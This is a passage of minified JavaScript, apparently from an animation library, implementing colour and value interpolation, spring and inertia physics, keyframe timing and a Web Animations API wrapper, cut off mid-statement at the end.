Gh="number",Xh="color",by="var",Cy="var(",$c="${}",Ay=/var\s*\(\s*--(?:[\w-]+\s*|[\w-]+\s*,(?:\s*[^)(\s]|\s*\((?:[^)(]|\([^)(]*\))*\))+\s*)\)|#[\da-f]{3,8}|(?:rgb|hsl)a?\((?:-?[\d.]+%?[,\s]+){2}-?[\d.]+%?\s*(?:[,/]\s*)?(?:\b\d+(?:\.\d+)?|\.\d+)?%?\)|-?(?:\d+(?:\.\d+)?|\.\d+)/giu;function Ey(e){const n=e.toString();return Hh.test(n)||zh.test(n)}function Qi(e){const n=e.toString(),t=[],i={color:[],number:[],var:[]},r=[];let s=0;const o=n.replace(Ay,l=>(ee.test(l)?(i.color.push(s),r.push(Xh),t.push(ee.parse(l))):l.startsWith(Cy)?(i.var.push(s),r.push(by),t.push(l)):(i.number.push(s),r.push(Gh),t.push(parseFloat(l))),++s,$c)).split($c);return{values:t,split:o,indexes:i,types:r}}function Py(e){return Qi(e).values}function Qh({split:e,types:n}){const t=e.length;return i=>{let r="";for(let s=0;s<t;s++)if(r+=e[s],i[s]!==void 0){const a=n[s];a===Gh?r+=jt(i[s]):a===Xh?r+=ee.transform(i[s]):r+=i[s]}return r}}function Ty(e){return Qh(Qi(e))}const Ly=e=>typeof e=="number"?0:ee.test(e)?ee.getAnimatableNone(e):e,Ry=(e,n)=>typeof e=="number"?n!=null&&n.trim().endsWith("/")?e:0:Ly(e);function Dy(e){const n=Qi(e);return Qh(n)(n.values.map((i,r)=>Ry(i,n.split[r])))}const qe={test:Sy,parse:Py,createTransformer:Ty,getAnimatableNone:Dy};function qa(e,n,t){return t<0&&(t+=1),t>1&&(t-=1),t<1/6?e+(n-e)*6*t:t<1/2?n:t<2/3?e+(n-e)*(2/3-t)*6:e}function qy({hue:e,saturation:n,lightness:t,alpha:i}){e/=360,n/=100,t/=100;let r=0,s=0,a=0;if(!n)r=s=a=t;else{const o=t<.5?t*(1+n):t+n-t*n,l=2*t-o;r=qa(l,o,e+1/3),s=qa(l,o,e),a=qa(l,o,e-1/3)}return{red:Math.round(r*255),green:Math.round(s*255),blue:Math.round(a*255),alpha:i}}function As(e,n){return t=>t>0?n:e}const j=(e,n,t)=>e+(n-e)*t,Na=(e,n,t)=>{const i=e*e,r=t*(n*n-i)+i;return r<0?0:Math.sqrt(r)},Ny=[ko,nt,qt],Iy=e=>Ny.find(n=>n.test(e));function Kc(e){const n=Iy(e);if(!n)return!1;let t=n.parse(e);return n===qt&&(t=qy(t)),t}const Jc=(e,n)=>{const t=Kc(e),i=Kc(n);if(!t||!i)return As(e,n);const r={...t};return s=>(r.red=Na(t.red,i.red,s),r.green=Na(t.green,i.green,s),r.blue=Na(t.blue,i.blue,s),r.alpha=j(t.alpha,i.alpha,s),nt.transform(r))},jo=new Set(["none","hidden"]);function My(e,n){return jo.has(e)?t=>t<=0?e:n:t=>t>=1?n:e}function Oy(e,n){return t=>j(e,n,t)}function gu(e){return typeof e=="number"?Oy:typeof e=="string"?mu(e)?As:ee.test(e)?Jc:Fy:Array.isArray(e)?Wh:typeof e=="object"?ee.test(e)?Jc:wy:As}function Wh(e,n){const t=[...e],i=t.length,r=e.map((s,a)=>gu(s)(s,n[a]));return s=>{for(let a=0;a<i;a++)t[a]=r[a](s);return t}}function wy(e,n){const t={...e,...n},i={};for(const r in t)e[r]!==void 0&&n[r]!==void 0&&(i[r]=gu(e[r])(e[r],n[r]));return r=>{for(const s in i)t[s]=i[s](r);return t}}function By(e,n){const t=[],i={color:0,var:0,number:0};for(let r=0;r<n.values.length;r++){const s=n.types[r],a=e.indexes[s][i[s]],o=e.values[a]??0;t[r]=o,i[s]++}return t}const Fy=(e,n)=>{const t=qe.createTransformer(n),i=Qi(e),r=Qi(n);return i.indexes.var.length===r.indexes.var.length&&i.indexes.color.length===r.indexes.color.length&&i.indexes.number.length>=r.indexes.number.length?jo.has(e)&&!r.values.length||jo.has(n)&&!i.values.length?My(e,n):tr(Wh(By(i,r),r.values),t):As(e,n)},Yc=/^(-?(?:\d+(?:\.\d*)?|\.\d+))([a-z%]*)$/iu;function ky(e,n){const t=Yc.exec(e);if(!t)return;const i=Yc.exec(n);if(!i||t[2]!==i[2])return;const r=t[2],s=parseFloat(t[1]),a=parseFloat(i[1]);return o=>jt(j(s,a,o))+r}function vu(e,n,t){if(typeof e=="number"&&typeof n=="number"&&typeof t=="number")return j(e,n,t);if(typeof e=="string"&&typeof n=="string"){const r=ky(e,n);if(r)return r}return gu(e)(e,n)}const jy=e=>{const n=({timestamp:t})=>e(t);return{start:(t=!0)=>U.update(n,t),stop:()=>Vn(n),now:()=>ie.isProcessing?ie.timestamp:le.now()}},$h=(e,n,t=10)=>{let i="";const r=Math.max(Math.round(n/t),2);for(let s=0;s<r;s++)i+=Math.round(e(s/(r-1))*1e4)/1e4+", ";return`linear(${i.substring(0,i.length-2)})`},yu=2e4;function xu(e,n=50,t=yu,i){let r=0,s=e.next(r);for(;!s.done&&r<t;)r+=n,s=e.next(r);return r>=t?1/0:r}function Uy(e,n=100,t){const i=t({...e,keyframes:[0,n]}),r=Math.min(xu(i),yu);return{type:"keyframes",ease:s=>i.next(r*s).value/n,duration:Fe(r)}}const oe={stiffness:100,damping:10,mass:1,duration:800,bounce:.3,visualDuration:.3,restSpeed:{granular:.01,default:2},restDelta:{granular:.005,default:.5},minDuration:.01,maxDuration:10,minDamping:.05,maxDamping:1};function Uo(e,n){return e*Math.sqrt(1-n*n)}const Vy=12;function _y(e,n,t){let i=t;for(let r=1;r<Vy;r++)i=i-e(i)/n(i);return i}const Ia=.001;function Hy({duration:e=oe.duration,bounce:n=oe.bounce}){let t,i,r=1-n;r=Ze(oe.minDamping,oe.maxDamping,r),e=Ze(oe.minDuration,oe.maxDuration,Fe(e)),r<1?(t=l=>{const u=l*r,c=u*e,d=Uo(l,r),p=Math.exp(-c);return Ia-u/d*p},i=l=>{const c=l*r*e,d=r*r*l*l*e,p=Math.exp(-c),g=Uo(l*l,r);return(-t(l)+Ia>0?-1:1)*-d*p/g}):(t=l=>{const u=Math.exp(-l*e),c=l*e+1;return-Ia+u*c},i=l=>{const u=Math.exp(-l*e),c=-l*(e*e);return u*c});const s=5/e,a=_y(t,i,s),o=a*a;return{stiffness:o,damping:r*2*Math.sqrt(o),duration:je(e)}}const Vo=(e,n)=>(n?e>=0:e>0)&&e<1/0;function Ma(e,n){if(Vo(e,n))return e}function zy(e){const n=Ma(e.stiffness),t=Ma(e.damping,!0),i=Ma(e.mass),r={...e,stiffness:n??oe.stiffness,damping:t??oe.damping,mass:i??oe.mass,isResolvedFromDuration:!1,isTimeDefined:(n??t??i)===void 0&&(e.duration!==void 0||e.bounce!==void 0)};if(r.isTimeDefined){if(e.visualDuration){const s=2*Math.PI/(e.visualDuration*1.2);r.stiffness=s*s,r.damping=2*Ze(.05,1,1-(e.bounce||0))*Math.sqrt(r.stiffness)}else Object.assign(r,Hy(r)),r.isResolvedFromDuration=!0;(!Vo(r.stiffness)||!Vo(r.damping,!0))&&(r.stiffness=oe.stiffness,r.damping=oe.damping)}return r}function Es(e=oe.visualDuration,n=oe.bounce){const t=typeof e!="object"?{visualDuration:e,keyframes:[0,1],bounce:n}:e,i=t.keyframes[0],r=t.keyframes[t.keyframes.length-1],s={done:!1,value:i},{stiffness:a,damping:o,mass:l,duration:u,isResolvedFromDuration:c,isTimeDefined:d}=zy({...t}),p=S=>d?0:-Fe(S),g=o/(2*Math.sqrt(a*l)),v=Fe(Math.sqrt(a/l)),x=g*v,b={target:r,delta:r-i,velocity:p(t.velocity||0)||0,restSpeed:0,restDelta:0},h=()=>{const S=Math.abs(b.delta)<5;b.restSpeed=t.restSpeed||(S?oe.restSpeed.granular:oe.restSpeed.default),b.restDelta=t.restDelta||(S?oe.restDelta.granular:oe.restDelta.default)};h();let m,f,y;if(g<1){const S=Uo(v,g),C={A:0,sinC:0,cosC:0,t:-1,env:0,sin:0,cos:0};y=()=>{C.A=(b.velocity+x*b.delta)/S,C.sinC=x*C.A+b.delta*S,C.cosC=x*b.delta-C.A*S};const I=q=>{q!==C.t&&(C.t=q,C.env=Math.exp(-x*q),C.sin=Math.sin(S*q),C.cos=Math.cos(S*q))};m=q=>(I(q),b.target-C.env*(C.A*C.sin+b.delta*C.cos)),f=q=>(I(q),C.env*(C.sinC*C.sin+C.cosC*C.cos))}else if(g===1){m=C=>b.target-Math.exp(-v*C)*(b.delta+(b.velocity+v*b.delta)*C);const S={C:0};y=()=>{S.C=b.velocity+v*b.delta},f=C=>Math.exp(-v*C)*(v*S.C*C-b.velocity)}else{const S=v*Math.sqrt(g*g-1);m=I=>{const q=Math.exp(-x*I),z=Math.min(S*I,300);return b.target-q*((b.velocity+x*b.delta)*Math.sinh(z)+S*b.delta*Math.cosh(z))/S};const C={P:0,sinh:0,cosh:0};y=()=>{C.P=(b.velocity+x*b.delta)/S,C.sinh=x*C.P-b.delta*S,C.cosh=x*b.delta-C.P*S},f=I=>{const q=Math.exp(-x*I),z=Math.min(S*I,300);return q*(C.sinh*Math.sinh(z)+C.cosh*Math.cosh(z))}}y();const A=c&&u||null,T={calculatedDuration:A,retarget:(S,C)=>{b.target=S[S.length-1],b.delta=b.target-S[0],b.velocity=p(C),t.restSpeed&&t.restDelta||h(),T.calculatedDuration=A,s.done=!1,y()},velocity:S=>je(f(S)),next:S=>{const C=m(S);if(c)s.done=S>=u;else{const I=je(f(S));s.done=Math.abs(I)<=b.restSpeed&&Math.abs(b.target-C)<=b.restDelta}return s.value=s.done?b.target:C,s},toString:()=>{const S=Math.min(xu(T),yu),C=$h(I=>T.next(S*I).value,S,30);return S+"ms "+C},toTransition:()=>{}};return T}Es.applyToOptions=e=>{const n=Uy(e,100,Es);return e.ease=n.ease,e.duration=je(n.duration),e.type="keyframes",e};function _o({keyframes:e,velocity:n=0,power:t=.8,timeConstant:i=325,bounceDamping:r=10,bounceStiffness:s=500,modifyTarget:a,min:o,max:l,restDelta:u=.5,restSpeed:c}){const d=e[0],p={done:!1,value:d},g=S=>S<o||S>l,v=S=>o===void 0?l:l===void 0||Math.abs(o-S)<Math.abs(l-S)?o:l;let x=t*n;const b=d+x,h=a===void 0?b:a(b);h!==b&&(x=h-d);const m=S=>-x*Math.exp(-S/i),f=S=>{const C=m(S);p.done=Math.abs(C)<=u,p.value=p.done?h:h+C};let y,A;const T=S=>{g(p.value)&&(y=S,A=Es({keyframes:[p.value,v(p.value)],velocity:-m(S)/i*1e3,damping:r,stiffness:s,restDelta:u,restSpeed:c}))};return T(0),{calculatedDuration:null,next:S=>{let C=!1;return!A&&y===void 0&&(C=!0,f(S),T(S)),y!==void 0&&S>=y?A.next(S-y):(!C&&f(S),p)}}}function Gy(e,n,t){const i=[],r=t||Sn.mix||vu,s=e.length-1;for(let a=0;a<s;a++){let o=r(e[a],e[a+1]);if(n){const l=Array.isArray(n)?n[a]||Je:n;o=tr(l,o)}i.push(o)}return i}function Xy(e,n,{clamp:t=!0,ease:i,mixer:r}={}){const s=e.length;if($s(s===n.length),s===1)return()=>n[0];if(s===2&&n[0]===n[1])return()=>n[1];const a=e[0]===e[1];e[0]>e[s-1]&&(e=[...e].reverse(),n=[...n].reverse());const o=Gy(n,i,r),l=o.length,u=c=>{if(a&&c<e[0])return n[0];let d=0;if(l>1)for(;d<e.length-2&&!(c<e[d+1]);d++);const p=Gi(e[d],e[d+1],c);return o[d](p)};return t?c=>u(Ze(e[0],e[s-1],c)):u}function Qy(e,n){const t=e[e.length-1];for(let i=1;i<=n;i++){const r=Gi(0,n,i);e.push(j(t,1,r))}}function Wy(e){const n=[0];return Qy(n,e.length-1),n}function $y(e,n){return e.map(t=>t*n)}function Ky(e,n){return e.map(()=>n||pu).splice(0,e.length-1)}function Ei({duration:e=300,keyframes:n,times:t,ease:i="easeInOut"}){const r=sy(i)?i.map(Xc):Xc(i)||pu,s={done:!1,value:n[0]};if(n.length===2&&!Array.isArray(r)&&(!t||t.length!==2||t[0]===0&&t[1]===1)){const[l,u]=n,c=l===u?void 0:(Sn.mix||vu)(l,u);return{calculatedDuration:e,next:d=>(s.value=c?c(r(e>0?Ze(0,1,d/e):1)):u,s.done=d>=e,s)}}const a=$y(t&&t.length===n.length?t:Wy(n),e),o=Xy(a,n,{ease:Array.isArray(r)?r:Ky(n,r)});return{calculatedDuration:e,next:l=>(s.value=o(l),s.done=l>=e,s)}}const Jy=5;function Yy(e,n,t){const i=Math.max(n-Jy,0);return Dh(t-e(i),n-i)}function Zy(e,n,t=0){return n<=0?t:e.velocity?e.velocity(n):Yy(i=>e.next(i).value,n,e.next(n).value)}const e0=e=>e!==null;function Ks(e,{repeat:n,repeatType:t="loop"},i,r=1){const s=e.filter(e0),o=r<0||n&&t!=="loop"&&n%2===1?0:s.length-1;return!o||i===void 0?s[o]:i}const n0={decay:_o,inertia:_o,tween:Ei,keyframes:Ei,spring:Es};function Kh(e){typeof e.type=="string"&&(e.type=n0[e.type])}function Jh(e,n){return{kind:e,animation:n,timestamp:le.now(),frameTimestamp:ie.timestamp,frameIsProcessing:ie.isProcessing}}function Yh(e,n,t){const i=globalThis.__MOTION_INSPECT__;if(i)try{i({...Jh("animation-start",e),options:t?{...n,...t}:n})}catch{}}function t0(e,n){const t=globalThis.__MOTION_INSPECT__;if(t)try{t({...Jh("layout-animation-start",e),node:n})}catch{}}class Su{constructor(){this.isResolved=!1}get finished(){return this._finished||(this._finished=this.isResolved?Promise.resolve():new Promise(n=>{this._resolve=n})),this._finished}updateFinished(){this._finished=this._resolve=void 0,this.isResolved=!1}notifyFinished(){var n;this.isResolved=!0,(n=this._resolve)==null||n.call(this)}then(n,t){return this.finished.then(n,t)}}const i0=e=>e/100;class Ps extends Su{constructor(n){super(),this.state="idle",this.startTime=null,this.isStopped=!1,this.currentTime=0,this.holdTime=null,this.playbackSpeed=1,this.delayState={done:!1,value:void 0},this.stop=()=>{var i,r;const{motionValue:t}=this.options;t&&t.updatedAt!==le.now()&&this.tick(le.now()),this.isStopped=!0,this.state!=="idle"&&(this.teardown(),(r=(i=this.options).onStop)==null||r.call(i))},this.options=n,this.initAnimation(),this.play(),n.autoplay===!1&&this.pause(),Yh(this,this.options)}initAnimation(){const{options:n}=this;Kh(n);const{type:t=Ei,repeat:i=0,repeatDelay:r=0,repeatType:s,velocity:a=0}=n;let{keyframes:o}=n;const l=t||Ei;l!==Ei&&typeof o[0]!="number"&&(this.mixKeyframes=tr(i0,vu(o[0],o[1])),o=[0,100]);const u=l(o===n.keyframes?n:{...n,keyframes:o});s==="mirror"&&(this.mirroredGenerator=l({...n,keyframes:[...o].reverse(),velocity:-a})),u.calculatedDuration===null&&(u.calculatedDuration=xu(u));const{calculatedDuration:c}=u;this.calculatedDuration=c,this.resolvedDuration=c+r,this.totalDuration=this.resolvedDuration*(i+1)-r,this.generator=u}updateTime(n){const t=Math.round(n-this.startTime)*this.playbackSpeed;this.holdTime!==null?this.currentTime=this.holdTime:this.currentTime=t}tick(n,t=!1){const{generator:i,totalDuration:r,mixKeyframes:s,mirroredGenerator:a,resolvedDuration:o,calculatedDuration:l}=this;if(this.startTime===null)return i.next(0);const{delay:u=0,keyframes:c,repeat:d,repeatType:p,repeatDelay:g,type:v,onUpdate:x,finalKeyframe:b}=this.options;this.speed>0?this.startTime=Math.min(this.startTime,n):this.speed<0&&(this.startTime=Math.min(n-r/this.speed,this.startTime)),t?this.currentTime=n:this.updateTime(n);const h=this.currentTime-u*(this.playbackSpeed>=0?1:-1),m=this.playbackSpeed>=0?h<0:h>r;this.currentTime=Math.max(h,0),this.state==="finished"&&this.holdTime===null&&(this.currentTime=r);let f=this.currentTime,y=i;if(d){const C=Math.min(this.currentTime,r)/o;let I=Math.floor(C),q=C%1;!q&&C>=1&&(q=1),q===1&&I--,I=Math.min(I,d+1),!!(I%2)&&(p==="reverse"?(q=1-q,g&&(q-=g/o)):p==="mirror"&&(y=a)),f=Ze(0,1,q)*o}let A;m?(this.delayState.value=c[0],A=this.delayState):A=y.next(f),s&&!m&&(A.value=s(A.value));let{done:T}=A;!m&&l!==null&&(T=this.playbackSpeed>=0?this.currentTime>=r:this.currentTime<=0);const S=this.holdTime===null&&(this.state==="finished"||this.state==="running"&&T);return S&&v!==_o&&(A.value=Ks(c,this.options,b,this.speed)),x&&x(A.value),S&&this.finish(),A}then(n,t){return this.finished.then(n,t)}get duration(){return Fe(this.calculatedDuration)}get iterationDuration(){const{delay:n=0}=this.options||{};return this.duration+Fe(n)}get time(){return Fe(this.currentTime)}set time(n){n=je(n),this.currentTime=n,this.startTime===null||this.holdTime!==null||this.playbackSpeed===0?this.holdTime=n:this.driver&&(this.startTime=this.driver.now()-n/this.playbackSpeed),this.driver?this.driver.start(!1):(this.startTime=0,this.state="paused",this.holdTime=n,this.tick(n))}getGeneratorVelocity(){return Zy(this.generator,this.currentTime,this.options.velocity)}get speed(){return this.playbackSpeed}set speed(n){const t=this.playbackSpeed!==n;t&&this.driver&&this.updateTime(le.now()),this.playbackSpeed=n,t&&this.driver&&(this.time=Fe(this.currentTime))}play(){var r,s;if(this.isStopped)return;const{driver:n=jy,startTime:t}=this.options;this.driver||(this.driver=n(a=>this.tick(a))),(s=(r=this.options).onPlay)==null||s.call(r);const i=this.driver.now();this.state==="finished"?(this.updateFinished(),this.startTime=i):this.holdTime!==null?this.startTime=i-this.holdTime:this.startTime||(this.startTime=t??i),this.state==="finished"&&this.speed<0&&(this.startTime+=this.calculatedDuration),this.holdTime=null,this.state="running",this.driver.start()}pause(){this.state="paused",this.updateTime(le.now()),this.holdTime=this.currentTime}complete(){this.state!=="running"&&this.play(),this.state="finished",this.holdTime=null}finish(){var n,t;this.notifyFinished(),this.teardown(),this.state="finished",(t=(n=this.options).onComplete)==null||t.call(n)}cancel(){var n,t;this.holdTime=null,this.startTime=0,this.tick(0),this.teardown(),(t=(n=this.options).onCancel)==null||t.call(n)}teardown(){this.state="idle",this.stopDriver(),this.startTime=this.holdTime=null}stopDriver(){this.driver&&(this.driver.stop(),this.driver=void 0)}sample(n){return this.startTime=0,this.tick(n,!0)}attachTimeline(n){var t;return this.options.allowFlatten&&(this.options.type="keyframes",this.options.ease="linear",this.initAnimation()),(t=this.driver)==null||t.stop(),n.observe(this)}}const r0=new Set(["brightness","contrast","saturate","opacity"]);function s0(e){const[n,t]=e.slice(0,-1).split("(");if(n==="drop-shadow")return e;const[i]=t.match(fu)||[];if(!i)return e;const r=t.replace(i,"");let s=r0.has(n)?1:0;return i!==t&&(s*=100),n+"("+s+r+")"}const a0=/\b([a-z-]*)\(.*?\)/gu,Ho={...qe,getAnimatableNone:e=>{const n=e.match(a0);return n?n.map(s0).join(" "):e}},zo={...qe,getAnimatableNone:e=>{const n=qe.parse(e);return qe.createTransformer(e)(n.map(i=>typeof i=="number"?0:typeof i=="object"?{...i,alpha:1}:i))}},Zc={...Jt,transform:Math.round},o0={rotate:un,pathRotation:un,rotateX:un,rotateY:un,rotateZ:un,scale:Rr,scaleX:Rr,scaleY:Rr,scaleZ:Rr,skew:un,skewX:un,skewY:un,distance:N,translateX:N,translateY:N,translateZ:N,x:N,y:N,z:N,perspective:N,transformPerspective:N,opacity:Xi,originX:Wc,originY:Wc,originZ:N},Ts={borderWidth:N,borderTopWidth:N,borderRightWidth:N,borderBottomWidth:N,borderLeftWidth:N,borderRadius:N,borderTopLeftRadius:N,borderTopRightRadius:N,borderBottomRightRadius:N,borderBottomLeftRadius:N,width:N,maxWidth:N,height:N,maxHeight:N,top:N,right:N,bottom:N,left:N,inset:N,insetBlock:N,insetBlockStart:N,insetBlockEnd:N,insetInline:N,insetInlineStart:N,insetInlineEnd:N,padding:N,paddingTop:N,paddingRight:N,paddingBottom:N,paddingLeft:N,paddingBlock:N,paddingBlockStart:N,paddingBlockEnd:N,paddingInline:N,paddingInlineStart:N,paddingInlineEnd:N,margin:N,marginTop:N,marginRight:N,marginBottom:N,marginLeft:N,marginBlock:N,marginBlockStart:N,marginBlockEnd:N,marginInline:N,marginInlineStart:N,marginInlineEnd:N,fontSize:N,backgroundPositionX:N,backgroundPositionY:N,...o0,zIndex:Zc,fillOpacity:Xi,strokeOpacity:Xi,numOctaves:Zc},l0={...Ts,color:ee,backgroundColor:ee,outlineColor:ee,fill:ee,stroke:ee,borderColor:ee,borderTopColor:ee,borderRightColor:ee,borderBottomColor:ee,borderLeftColor:ee,filter:Ho,WebkitFilter:Ho,mask:zo,WebkitMask:zo},Zh=e=>l0[e],u0=new Set([Ho,zo]);function bu(e,n){let t=Zh(e);return u0.has(t)||(t=qe),t.getAnimatableNone?t.getAnimatableNone(n):void 0}function c0(e){for(let n=1;n<e.length;n++)e[n]??(e[n]=e[n-1])}const tt=e=>e*180/Math.PI,Go=e=>{const n=tt(Math.atan2(e[1],e[0]));return Xo(n)},d0={x:4,y:5,translateX:4,translateY:5,scaleX:0,scaleY:3,scale:e=>(Math.abs(e[0])+Math.abs(e[3]))/2,rotate:Go,rotateZ:Go,skewX:e=>tt(Math.atan(e[1])),skewY:e=>tt(Math.atan(e[2])),skew:e=>(Math.abs(e[1])+Math.abs(e[2]))/2},Xo=e=>(e=e%360,e<0&&(e+=360),e),ed=Go,nd=e=>Math.sqrt(e[0]*e[0]+e[1]*e[1]),td=e=>Math.sqrt(e[4]*e[4]+e[5]*e[5]),p0={x:12,y:13,z:14,translateX:12,translateY:13,translateZ:14,scaleX:nd,scaleY:td,scale:e=>(nd(e)+td(e))/2,rotateX:e=>Xo(tt(Math.atan2(e[6],e[5]))),rotateY:e=>Xo(tt(Math.atan2(-e[2],e[0]))),rotateZ:ed,rotate:ed,skewX:e=>tt(Math.atan(e[4])),skewY:e=>tt(Math.atan(e[1])),skew:e=>(Math.abs(e[1])+Math.abs(e[4]))/2};function Qo(e){return e.includes("scale")?1:0}function Wo(e,n){if(!e||e==="none")return Qo(n);const t=e.match(/^matrix3d\(([-\d.e\s,]+)\)$/u);let i,r;if(t)i=p0,r=t;else{const o=e.match(/^matrix\(([-\d.e\s,]+)\)$/u);i=d0,r=o}if(!r)return Qo(n);const s=i[n],a=r[1].split(",").map(f0);return typeof s=="function"?s(a):a[s]}const m0=(e,n)=>{const{transform:t="none"}=getComputedStyle(e);return Wo(t,n)};function f0(e){return parseFloat(e.trim())}const Yt=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],Zt=new Set([...Yt,"pathRotation"]),id=e=>e===Jt||e===N,h0=new Set(["x","y","z"]),g0=Yt.filter(e=>!h0.has(e));function v0(e){const n=[];return g0.forEach(t=>{const i=e.getValue(t);if(i!==void 0){const r=i.get(),s=t.startsWith("scale")?1:0;if(r===s)return;n.push([t,r]),i.set(s)}}),n}const y0=new Set(["bottom","right"]);function rd(e,n,t,i,r,s){const a=parseFloat(e);if(!isNaN(a))return a;const{min:o,max:l}=n()[t],u=l-o;return s==="border-box"?u:u-parseFloat(i)-parseFloat(r)}const st={width:({width:e,paddingLeft:n="0",paddingRight:t="0",boxSizing:i},r)=>rd(e,r,"x",n,t,i),height:({height:e,paddingTop:n="0",paddingBottom:t="0",boxSizing:i},r)=>rd(e,r,"y",n,t,i),top:({top:e})=>parseFloat(e),left:({left:e})=>parseFloat(e),bottom:({top:e},n)=>{const{y:t}=n();return parseFloat(e)+(t.max-t.min)},right:({left:e},n)=>{const{x:t}=n();return parseFloat(e)+(t.max-t.min)},x:({transform:e})=>Wo(e,"x"),y:({transform:e})=>Wo(e,"y")};st.translateX=st.x;st.translateY=st.y;const at=new Set;let $o=!1,Ko=!1,Jo=!1;function e1(){if(Ko){const e=[],n=new Set,t=new Set;at.forEach(r=>{r.needsMeasurement&&(e.push(r),n.add(r.element),y0.has(r.name)&&t.add(r.element))});const i=new Map;t.forEach(r=>{const s=v0(r);s.length&&(i.set(r,s),r.render())}),e.forEach(r=>r.measureInitialState()),n.forEach(r=>{r.render();const s=i.get(r);s&&s.forEach(([a,o])=>{var l;(l=r.getValue(a))==null||l.set(o)})}),e.forEach(r=>r.measureEndState()),e.forEach(r=>{r.suspendedScrollY!==void 0&&window.scrollTo(0,r.suspendedScrollY)})}Ko=!1,$o=!1,at.forEach(e=>e.complete(Jo)),at.clear()}function n1(){at.forEach(e=>{e.readKeyframes(),e.needsMeasurement&&(Ko=!0)})}function x0(){Jo=!0,n1(),e1(),Jo=!1}function S0(e,n,t){if(typeof e=="string"){if(lu(e)||uu(e))return parseFloat(e);if(!qe.test(e)&&qe.test(t))return bu(n,t)}return e??void 0}class Cu{constructor(n,t,i,r,s,a=!1){this.state="pending",this.isAsync=!1,this.needsMeasurement=!1,this.unresolvedKeyframes=[...n],this.onComplete=t,this.name=i,this.motionValue=r,this.element=s,this.isAsync=a}scheduleResolve(){this.state="scheduled",this.isAsync?(at.add(this),$o||($o=!0,U.read(n1),U.resolveKeyframes(e1))):(this.readKeyframes(),this.complete())}readKeyframes(){const{unresolvedKeyframes:n,name:t,element:i,motionValue:r}=this;if(n[0]===null){const s=r==null?void 0:r.get(),a=n[n.length-1];if(s!==void 0)n[0]=s;else if(i&&t){const o=S0(i.readValue(t,a),t,a);o!==void 0&&(n[0]=o)}n[0]===void 0&&(n[0]=a),r&&s===void 0&&r.set(n[0])}c0(n)}setFinalKeyframe(){}measureInitialState(){}renderEndStyles(){}measureEndState(){}complete(n=!1){this.state="complete",this.onComplete(this.unresolvedKeyframes,this.finalKeyframe,n),at.delete(this)}cancel(){this.state==="scheduled"&&(at.delete(this),this.state="pending")}resume(){this.state==="pending"&&this.scheduleResolve()}}const b0=e=>e.startsWith("--");function t1(e,n,t){b0(n)?e.style.setProperty(n,t):e.style[n]=t}const C0={};function i1(e,n){const t=Rh(e);return()=>C0[n]??t()}const A0=i1(()=>window.ScrollTimeline!==void 0,"scrollTimeline"),r1=i1(()=>{try{document.createElement("div").animate({opacity:0},{easing:"linear(0, 1)"})}catch{return!1}return!0},"linearEasing"),fi=([e,n,t,i])=>`cubic-bezier(${e}, ${n}, ${t}, ${i})`,sd={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:fi([0,.65,.55,1]),circOut:fi([.55,0,1,.45]),backIn:fi([.31,.01,.66,-.59]),backOut:fi([.33,1.53,.69,.99])};function s1(e,n){if(e)return typeof e=="function"?r1()?$h(e,n):"ease-out":kh(e)?fi(e):Array.isArray(e)?e.map(t=>s1(t,n)||sd.easeOut):sd[e]}function E0(e,n,t,{delay:i=0,duration:r=300,repeat:s=0,repeatType:a="loop",ease:o="easeOut",times:l}={},u=void 0){const c={[n]:t};l&&(c.offset=l);const d=s1(o,r);Array.isArray(d)&&(c.easing=d);const p={delay:i,duration:r,easing:Array.isArray(d)?"linear":d,fill:"both",iterations:s+1,direction:a==="reverse"?"alternate":"normal"};return u&&(p.pseudoElement=u),e.animate(c,p)}function a1(e){return typeof e=="function"&&"applyToOptions"in e}function P0({type:e,...n}){return a1(e)&&r1()?e.applyToOptions(n):(n.duration??(n.duration=300),n.ease??(n.ease="easeOut"),n)}class o1 extends Su{constructor(n){if(super(),this.finishedTime=null,this.isStopped=!1,this.manualStartTime=null,!n)return;const{element:t,name:i,keyframes:r,pseudoElement:s,allowFlatten:a=!1,finalKeyframe:o,onComplete:l}=n;this.isPseudoElement=!!s,this.allowFlatten=a,this.options=n,$s(typeof n.type!="string");const u=P0(n);this.animation=E0(t,i,r,u,s),u.autoplay===!1&&this.animation.pause(),this.animation.onfinish=()=>{if(this.finishedTime=this.time,!s){const c=Ks(r,this.options,o,this.speed);this.updateMotionValue&&this.updateMotionValue(c),t1(t,i,c),this.animation.cancel()}l==null||l(),this.notifyFinished()},Yh(this,n,u)}play(){this.isStopped||(this.manualStartTime=null,this.animation.play(),this.state==="finished"&&this.updateFinished())}pause(){this.animation.pause()}complete(){var n,t;(t=(n=this.animation).finish)==null||t.call(n)}cancel(){try{this.animation.cancel()}catch{}}stop(){if(this.isStopped)return;this.isStopped=!0;const{state:n}=this;n==="idle"||n==="finished"||(this.updateMotionValue?this.updateMotionValue():this.commitStyles(),this.isPseudoElement||this.cancel())}commitStyles(){var t,i,r;const n=(t=this.options)==null?void 0:t.element;!this.isPseudoElement&&(n!=null&&n.isConnected)&&((r=(i=this.animation).commitStyles)==null||r.call(i))}get duration(){var t,i;const n=((i=(t=this.animation.effect)==null?void 0:t.getComputedTiming)==null?void 0:i.call(t).duration)||0;return Fe(Number(n))}get iterationDuration(){const{delay:n=0}=this.options||{};return this.duration+Fe(n)}get time(){return Fe(Number(this.animation.currentTime)||0)}set time(n){const t=this.finishedTime!==null;this.manualStartTime=null,this.finishedTime=null,this.animation.currentTime=je(n),t&&this.animation.pause()}get speed(){return this.animation.playbackRate}set speed(n){n<0&&(this.finishedTime=null),this.animation.playbackRate=n}get state(){return this.finishedTime!==null?"finished":this.animation.playState}get startTime(){return this.manualStartTime??Number(this.animation.startTime)}set startTime(n){this.manualStartTime=this.animation.startTime=n}attachTimeline({timeline:n,rangeStart:t,rangeEnd:i,observe:r}){var s;return this.allowFlatten&&((s=this.animation.effect)==null||s.updateTiming({easing:"linear"})),this.animation.onfinish=null,n&&A0()?(this.animation.timeline=n,t&&(this.animation.rangeStart=t),i&&(this.animation.rangeEnd=i),Je):r(this)}}const l1={anticipate:wh,backInOut:Oh,circInOut:Fh};function T0(e){return e in l1}function L0(e){typeof e.ease=="string"&&T0(e.ease)&&(e.ease=l1[e.ease])}const Oa=10;class R0 extends o1{constructor(n){L0(n),Kh(n),super(n),n.startTime!==void 